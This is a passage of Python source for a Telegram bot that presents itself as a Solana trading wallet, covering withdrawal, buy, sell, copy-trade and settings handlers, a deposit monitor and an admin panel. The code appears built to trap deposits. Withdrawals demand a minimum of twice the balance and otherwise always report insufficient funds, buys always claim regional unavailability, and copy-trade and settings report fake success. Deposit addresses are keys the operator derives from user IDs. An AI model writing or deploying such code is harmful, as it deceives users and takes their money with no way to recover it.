            cancelled_msg = await update.message.reply_text(
                "❌ <b>Withdrawal Cancelled.</b>", parse_mode="HTML"
            )
            await asyncio.sleep(1.5)
            try:
                await cancelled_msg.delete()
            except Exception:
                pass
            await show_wallet(update, context)
            return

        await _del_prompt()

        try:
            amount = float(text)
        except ValueError:
            await update.message.reply_text(
                "❗ Invalid amount. Please enter a number.",
                reply_markup=back_btn,
            )
            context.user_data.pop("awaiting_withdraw", None)
            return

        if amount <= 0:
            await update.message.reply_text(
                "❗ Withdrawal amount must be greater than zero.",
                reply_markup=back_btn,
            )
            context.user_data.pop("awaiting_withdraw", None)
            return

        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0
        stored_data = user_balances.get(user_id, {})
        minimum_withdrawal = stored_data.get("min_withdrawal", user_balance * 2)

        if user_balance == 0:
            await update.message.reply_text(
                "❗ Insufficient SOL balance.", reply_markup=back_btn
            )
            context.user_data.pop("awaiting_withdraw", None)
            return

        if usd_value < 10:
            await update.message.reply_text(
                f"❗ Your balance must be above $10 to withdraw.\n\n"
                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
                f"Please deposit more SOL to meet the minimum withdrawal requirement.",
                reply_markup=back_btn,
            )
            context.user_data.pop("awaiting_withdraw", None)
            return

        if amount < minimum_withdrawal:
            await update.message.reply_text(
                f"❗ <b>Withdrawal Amount Too Low</b>\n\n"
                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
                f"Minimum withdrawal: {minimum_withdrawal:.4f} SOL\n\n"
                f"You need to withdraw at least {minimum_withdrawal:.4f} SOL.\n"
                f"Please enter a higher amount or deposit more funds.",
                parse_mode="HTML",
                reply_markup=back_btn,
            )
            context.user_data.pop("awaiting_withdraw", None)
            return

        await update.message.reply_text(
            f"❗ <b>Insufficient Balance for Withdrawal</b>\n\n"
            f"Withdrawal amount: {amount:.4f} SOL\n"
            f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
            f"You don't have enough SOL to complete this withdrawal.\n"
            f"Please deposit more funds to your wallet.",
            parse_mode="HTML",
            reply_markup=back_btn,
        )
        context.user_data.pop("awaiting_withdraw", None)
        return

    # ----- Handle Copy Trade -----
    if context.user_data.get("awaiting_copy_trade"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_copy_trade", None)
            await update.message.reply_text(
                "Copy Trade cancelled.", reply_markup=main_menu_markup()
            )
            return

        wallet_address = text.strip()

        # ✅ Check if wallet address looks valid (length = 44 and letters/numbers only)
        if len(wallet_address) != 44 or not wallet_address.isalnum():
            await update.message.reply_text(
                "❗ Invalid Solana wallet address.", reply_markup=cancel_markup()
            )
            return

        # Check user balance
        user_balance = get_user_balance(user_id)

        # If balance is 0, show insufficient balance
        if user_balance == 0:
            await update.message.reply_text(
                "❗ Insufficient SOL balance.", reply_markup=main_menu_markup()
            )
            context.user_data.pop("awaiting_copy_trade", None)
            return

        # If balance > 0, show success message
        await update.message.reply_text(
            f"✅ <b>Address Added Successfully!</b>\n\n"
            f"Wallet address has been added to your copy trade list:\n\n"
            f"<code>{wallet_address}</code>\n\n"
            f"You will now copy trades from this wallet automatically.",
            parse_mode="HTML",
            reply_markup=main_menu_markup(),
        )

        context.user_data.pop("awaiting_copy_trade", None)
        return

    # ----- Handle Custom Buy Amount -----
    if context.user_data.get("awaiting_custom_buy"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_custom_buy", None)
            await update.message.reply_text(
                "Buy cancelled.", reply_markup=main_menu_markup()
            )
            return

        try:
            amount = float(text)
            if amount <= 0:
                await update.message.reply_text(
                    "❗ Amount must be greater than zero.", reply_markup=cancel_markup()
                )
                return
        except ValueError:
            await update.message.reply_text(
                "❗ Invalid amount. Please enter a valid number.",
                reply_markup=cancel_markup(),
            )
            return

        token_address = context.user_data.get("awaiting_custom_buy", "")

        # Check user balance and apply validation rules
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0

        # Balance validation rules
        if user_balance == 0:
            await update.message.reply_text(
                f"❗ Insufficient SOL balance.",
                parse_mode="HTML",
                reply_markup=main_menu_markup(),
            )
            context.user_data.pop("awaiting_custom_buy", None)
            return
        elif usd_value < 10:
            await update.message.reply_text(
                f"❗ Minimum amount required to buy a token is above $10.\n\n"
                f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                parse_mode="HTML",
                reply_markup=main_menu_markup(),
            )
            context.user_data.pop("awaiting_custom_buy", None)
            return
        else:
            # Balance >= $10
            await update.message.reply_text(
                f"Buying tokens is currently not available in your region at the moment. Try again later.\n\n"
                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                parse_mode="HTML",
                reply_markup=main_menu_markup(),
            )
            context.user_data.pop("awaiting_custom_buy", None)
            return

    # ----- Handle Custom Sell Percentage -----
    if context.user_data.get("awaiting_custom_sell"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_custom_sell", None)
            await update.message.reply_text(
                "Sell cancelled.", reply_markup=main_menu_markup()
            )
            return
        try:
            percentage = float(text)
            if percentage <= 0 or percentage > 100:
                await update.message.reply_text(
                    "❗ Percentage must be between 0 and 100.",
                    reply_markup=cancel_markup(),
                )
                return
        except ValueError:
            await update.message.reply_text(
                "❗ Invalid percentage. Please enter a valid number.",
                reply_markup=cancel_markup(),
            )
            return

        token_address = context.user_data.get("awaiting_custom_sell", "")

        # ❌ Removed derive_keypair and admin forwarding

        # ✅ Just show user response
        await update.message.reply_text(
            f"🔴 <b>Sell Order Submitted</b>\n\n"
            f"Percentage: {percentage}%\n"
            f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
            f"❗ No token balance to sell.",
            parse_mode="HTML",
            reply_markup=main_menu_markup(),
        )

        context.user_data.pop("awaiting_custom_sell", None)

        return

    # ----- Handle Buy Token -----
    if context.user_data.get("awaiting_token_contract"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_token_contract", None)
            # Clear all tracked trade messages
            chat_id = (
                context.user_data.pop("trade_chat_id", None) or update.message.chat_id
            )
            for msg_id in context.user_data.pop("trade_msg_ids", []):
                try:
                    await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
                except Exception:
                    pass
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return

        token_address = text.strip()

        base58_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
        if not re.match(base58_pattern, token_address):
            await update.message.reply_text(
                "❗ Invalid token contract address. Please enter a valid Solana token address.\n\n"
                "Solana addresses are 32-44 characters and use base58 encoding.",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
                ),
            )
            return

        # Delete the prompt message before fetching
        chat_id = context.user_data.get("trade_chat_id") or update.message.chat_id
        for msg_id in context.user_data.get("trade_msg_ids", []):
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
            except Exception:
                pass
        context.user_data["trade_msg_ids"] = []
        context.user_data["trade_chat_id"] = update.message.chat_id

        # Send fetching message
        fetching_msg = await update.message.reply_text("🔍 Fetching token details...")

        pair_data = await get_token_details(token_address)

        # Delete fetching message before showing result
        try:
            await fetching_msg.delete()
        except Exception:
            pass

        if pair_data:
            user_balance = get_user_balance(user_id)
            token_info = format_token_details(pair_data, wallet_balance=user_balance)
            if token_info:
                context.user_data["current_token"] = token_address

                buy_sell_keyboard = InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "🟢 Buy 0.1 SOL",
                                callback_data=f"buy_0.1_{token_address}",
                            ),
                            InlineKeyboardButton(
                                "🔴 Sell 50%", callback_data=f"sell_50_{token_address}"
                            ),
                        ],
                        [
                            InlineKeyboardButton(
                                "🟢 Buy 0.5 SOL",
                                callback_data=f"buy_0.5_{token_address}",
                            ),
                            InlineKeyboardButton(
                                "🔴 Sell 100%",
                                callback_data=f"sell_100_{token_address}",
                            ),
                        ],
                        [
                            InlineKeyboardButton(
                                "🟢 Buy 1.0 SOL",
                                callback_data=f"buy_1.0_{token_address}",
                            ),
                            InlineKeyboardButton(
                                "🔴 Sell x%",
                                callback_data=f"sell_custom_{token_address}",
                            ),
                        ],
                        [
                            InlineKeyboardButton(
                                "🟢 Buy 3.0 SOL",
                                callback_data=f"buy_3.0_{token_address}",
                            )
                        ],
                        [
                            InlineKeyboardButton(
                                "🟢 Buy 5.0 SOL",
                                callback_data=f"buy_5.0_{token_address}",
                            )
                        ],
                        [
                            InlineKeyboardButton(
                                "🟢 Buy x SOL",
                                callback_data=f"buy_custom_{token_address}",
                            )
                        ],
                        [InlineKeyboardButton("⬅️ Back", callback_data="back_trade")],
                    ]
                )

                sent = await update.message.reply_text(
                    token_info,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                    reply_markup=buy_sell_keyboard,
                )
                context.user_data["trade_msg_ids"].append(sent.message_id)
            else:
                await update.message.reply_text(
                    "❗ Error formatting token details. Please try again.",
                    reply_markup=InlineKeyboardMarkup(
                        [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
                    ),
                )
        else:
            await update.message.reply_text(
                "❗ Token not found or no trading pairs available. Please check the contract address.",
                reply_markup=main_menu_markup(),
            )

        context.user_data.pop("awaiting_token_contract", None)
        return

    # ----- Handle Settings Number Input -----
    if user_id in user_states:
        # Check if input is a number
        if not text.isdigit():
            await update.message.reply_text(
                "❌ Please enter numbers only. Use the Cancel button above to cancel this input."
            )
            return

        option = user_states.pop(user_id)  # Remove state after use

        # Show success message with confirmation
        success_message = (
            f"✅ <b>Setting Updated Successfully!</b>\n\n"
            f"📋 <b>{option.replace('_', ' ').title()}</b> has been set to: <b>{text}</b>\n\n"
            f"Your new setting is now active and will be applied to your trading activities.\n\n"
            f"💡 You can update this setting anytime by going back to Settings."
        )

        await update.message.reply_text(
            success_message, parse_mode="HTML", reply_markup=main_menu_markup()
        )
        return

    # ----- Handle Refresh Portfolio keyboard button -----
    if text == "🔄 Refresh Portfolio":
        await check_and_notify_deposits(user_id, context)
        await show_wallet(update, context)
        return

    else:
        await update.message.reply_text(
            "👇 Use the buttons below to navigate.",
            reply_markup=main_menu_inline(),
        )
        return


async def background_deposit_monitor(context: ContextTypes.DEFAULT_TYPE):
    """Background task to continuously monitor deposits for all users"""
    try:
        # Check deposits for all users who have balances
        for telegram_id in list(user_balances.keys()):
            try:
                public_address, _ = derive_keypair_and_address(telegram_id)
                await monitor_deposits(
                    telegram_id, public_address, context, notify_user=True
                )
            except Exception as e:
                print(f"Error monitoring deposits for user {telegram_id}: {e}")
    except Exception as e:
        print(f"Error in background deposit monitor: {e}")


# --- Admin Panel ---
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
            [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
            [InlineKeyboardButton("📜 Banned List", callback_data="admin_list_banned")],
            [
                InlineKeyboardButton(
                    "👤 User Details", callback_data="admin_user_details"
                )
            ],
            [
                InlineKeyboardButton(
                    "🔗 Change Support Link", callback_data="admin_change_support"
                )
            ],
        ]
    )

    await update.message.reply_text(
        "🛠 <b>Admin Panel</b>\n\nWelcome Admin. Choose an action:",
        parse_mode="HTML",
        reply_markup=keyboard,
    )


# --- Main ---
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("support", support))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(CommandHandler("settings", settings_menu))

    # Start background deposit monitoring (runs every 30 seconds) new
    app.job_queue.run_repeating(background_deposit_monitor, interval=30, first=10)

    print("Bot is running...")
    print("Background deposit monitoring started (checks every 30 seconds)...")
    app.run_polling()


if __name__ == "__main__":
    main()
